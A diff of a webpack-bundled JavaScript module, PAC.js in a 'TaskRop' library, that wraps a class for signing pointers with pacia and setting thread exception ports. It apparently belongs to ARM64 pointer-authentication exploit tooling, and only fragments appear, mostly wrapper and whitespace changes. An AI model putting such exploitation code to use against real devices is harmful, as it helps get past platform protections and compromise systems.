@@ -1,3 +1,9 @@
+/***/ "./src/libs/TaskRop/PAC.js":
+/*!*********************************!*\
+  !*** ./src/libs/TaskRop/PAC.js ***!
+  \*********************************/
+/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+
 __webpack_require__.r(__webpack_exports__);
 /* harmony export */ __webpack_require__.d(__webpack_exports__, {
 /* harmony export */   "default": () => (/* binding */ PAC)
@@ -32,7 +38,7 @@ class PAC
 	static remotePAC(threadAddr, address, modifier)
 	{
 		return Native.pacia(address, modifier);
-
+		
 		//return this.remotePACLocal(address, modifier);
 		/*
 		if (!this.gadget_pacia)
@@ -102,7 +108,7 @@ class PAC
 			exceptionPort,
 			Utils.EXCEPTION_STATE | Utils.MACH_EXCEPTION_CODES,
 			BigInt(Utils.ARM_THREAD_STATE64));
-
+		
 		if (kr != 0)
 		{
 			console.log(`thread_set_exception_ports failed:${kr}`);
@@ -201,3 +207,5 @@ class PAC
 	}
 	*/
 }
+
+/***/ }),
